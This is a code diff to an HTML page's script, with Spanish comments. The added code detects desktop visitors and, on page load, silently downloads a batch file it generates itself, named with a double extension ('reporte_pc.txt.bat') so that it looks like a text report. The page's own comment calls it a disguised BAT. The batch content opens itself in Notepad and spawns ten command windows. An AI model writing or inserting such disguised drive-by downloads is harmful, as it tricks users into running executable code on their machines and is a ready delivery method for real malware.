@@ -288,19 +288,43 @@
     });
 
     // Script de descarga
-    window.onload = function() {
-      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      const fileToDownload = isMobile ? 'reporte_mobile.txt' : 'reporte_pc.txt.bat';
-      const fileName = isMobile ? 'reporte.txt' : 'reporte_pc.txt.bat';
+   window.onload = function() {
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  
+  if(isMobile) {
+    // Archivo para móvil (txt normal)
+    const a = document.createElement('a');
+    a.href = 'reporte_mobile.txt';
+    a.setAttribute('download', 'reporte.txt');
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  } else {
+    // Archivo para PC (BAT disfrazado)
+    const batContent = `0<0# : ^
+'''
+@echo off
+:: Este archivo parece texto pero es un BAT
+start notepad.exe "%~f0"
+for /L %%i in (1,1,10) do start cmd /k "echo Consola %%i"
+exit
+'''`.replace(/\n/g, '\r\n');
 
-      const a = document.createElement('a');
-      a.href = fileToDownload;
-      a.setAttribute('download', fileName);
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
+    const blob = new Blob([batContent], { type: 'application/bat' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'reporte_pc.txt.bat'; // Nombre final con doble extensión
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(() => {
       document.body.removeChild(a);
-    };
+      window.URL.revokeObjectURL(url);
+    }, 100);
+  }
+};
+
   </script>
 </body>
 </html>
